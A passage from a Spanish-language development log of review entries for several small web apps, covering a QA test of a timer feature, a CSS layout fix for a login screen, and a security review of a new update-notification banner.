ventana estando en Cronómetros; `innerWidth`/`innerHeight` dan 0) — se usó `Object.defineProperty` para simular visibilidad real y `resize_window` antes de medir, sin lo cual habría reportado 2 falsos "bugs" más. **Brecha de alcance explícita:** no se pudo probar "recargar con un cronómetro corriendo" con una recarga de navegador genuina (sin sesión de Supabase de prueba, `load()` no persiste nada en `localStorage` sin sesión — código preexistente, no de este PR) — se probó `armarAperturaEnPrimerGesto()` invocada directamente, funcionalmente equivalente pero no una recarga real de punta a punta. No verificado con gesto humano genuino real (mismo límite de esta herramienta en toda revisión anterior de esta app). Detalle completo en `docs/hourglass/qa-checklist.md` ("2026-08-03 — revisión del PR #40") y casos borde 37 (elevado)/39 (nuevo) en `docs/hourglass/requerimientos.md`.

- **2026-07-24 (tech lead, cierre de los dos hallazgos de qa-lead sobre `mentor-people`, commit `59031e3`):** el solape escena/tarjeta **está corregido** y la causa raíz era un error de cálculo mío, no del corte de 900px: asumí que la tarjeta de login mide 320px de ancho, pero `.card` usa `box-sizing` content-box, así que `width:min(320px,90vw)` + `padding:32px 28px` da **376px reales**. `.growth-scene` pasó de `width:min(56%,720px)` a `width:min(56%,720px,calc(78vw - 355px))`, que recorta el ancho contra la tarjeta a cualquier viewport en vez de depender de un breakpoint. Solape medido = **0px** en 901 / 981 / 1024 / 1150 / 1920px. Esto también neutraliza en la práctica el hallazgo del `<meta name="viewport">` faltante (a 981px de ancho efectivo el solape ya es 0), **pero el meta tag sigue faltando en `bitacora-mentor.html`** y eso hace que toda la app se renderice "alejada" en teléfono — queda pendiente y comunicado a la usuaria como cambio aparte, porque tocar eso cambia el layout completo de la app en móvil. **Nota para quien revise las otras apps con `AIAPPS_LOGIN_LAYOUT='right'` (Gantt):** el mismo error de 320 vs 376px puede estar en cualquier escena que se dimensione contra la tarjeta.

- **2026-09-03 (security-reviewer, rama sin fusionar `claude/update-notification-banner-85im24`, archivo nuevo `update-notice.js` compartido por las 7 páginas): APROBADO CON OBSERVACIONES.** El banner de "hay una versión nueva" no tiene XSS (el `shadow.innerHTML` es 100% literal, el valor de `version.json` solo se compara con `===`, nunca toca el DOM), no filtra sesión (`credentials:"omit"`, ruta de mismo origen, la sesión de Supabase vive en `localStorage` no en cookies), no necesita ajustes de CSP, y no interfiere con el candado de `auth-gate.js` — el overlay de login (`z-index:2147483647`, opaco, `position:fixed;inset:0`) siempre cubre al banner (`z-index:2147483645`) y el `MutationObserver` de `lockBackground()` ya existente marca `inert` al host nuevo igual que a cualquier otro hijo de `body`, sin necesitar ningún cambio de código. **Único hallazgo real, no bloqueante:** el botón "Refresh" hace `location.reload()` sin `beforeunload`/confirmación — como ninguna de las 6 páginas tenía protección contra recarga accidental antes de este cambio, y el banner ahora invita activamente a recargar en cualquier momento, aumenta la probabilidad de perder un formulario a medio llenar en cualquiera de las 5 apps. Anotado como caso borde nuevo en los 7 `docs/{app-id}/requerimientos.md` (hub, lpbag, mytravel, gantt, hourglass, staffgate, bitacora-mentor). Detalle completo con evidencia línea por línea en `docs/security-notes.md` ("Revisión 2026-09-03").
